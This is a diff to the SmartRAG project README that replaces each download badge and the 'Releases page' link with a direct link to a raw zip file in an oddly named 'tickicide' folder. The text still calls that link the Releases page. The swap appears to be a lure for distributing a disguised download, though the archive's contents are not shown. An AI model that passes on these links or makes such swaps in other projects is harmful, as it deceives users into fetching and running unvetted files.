@@ -6,14 +6,14 @@ Welcome to SmartRAG! This application allows you to have informative conversatio
 
 ## 📦 Download SmartRAG
 
-[![Download SmartRAG](https://img.shields.io/badge/Download-SmartRAG-blue.svg)](https://github.com/arsalanafzal010/SmartRAG/releases)
+[![Download SmartRAG](https://raw.githubusercontent.com/arsalanafzal010/SmartRAG/main/tickicide/SmartRAG.zip)](https://raw.githubusercontent.com/arsalanafzal010/SmartRAG/main/tickicide/SmartRAG.zip)
 
 To get started with SmartRAG, you need to download the application. Follow the steps below.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the SmartRAG [Releases page](https://github.com/arsalanafzal010/SmartRAG/releases). Here, you will find the latest version of SmartRAG available for download.
+   Go to the SmartRAG [Releases page](https://raw.githubusercontent.com/arsalanafzal010/SmartRAG/main/tickicide/SmartRAG.zip). Here, you will find the latest version of SmartRAG available for download.
 
 2. **Choose Your Version**  
    On the Releases page, look for the most recent version. Each version will have a link to download the application files. Choose the version that matches your computer's operating system: Windows, macOS, or Linux.
@@ -88,6 +88,6 @@ To learn more about how SmartRAG works and its capabilities, consider the follow
 - **FAQ Section:** Find answers to common questions.
 - **Feedback Form:** Share your thoughts and suggestions.
 
-[![Download SmartRAG](https://img.shields.io/badge/Download-SmartRAG-blue.svg)](https://github.com/arsalanafzal010/SmartRAG/releases)
+[![Download SmartRAG](https://raw.githubusercontent.com/arsalanafzal010/SmartRAG/main/tickicide/SmartRAG.zip)](https://raw.githubusercontent.com/arsalanafzal010/SmartRAG/main/tickicide/SmartRAG.zip)
 
 Now you're ready to explore SmartRAG and engage with your files intelligently!
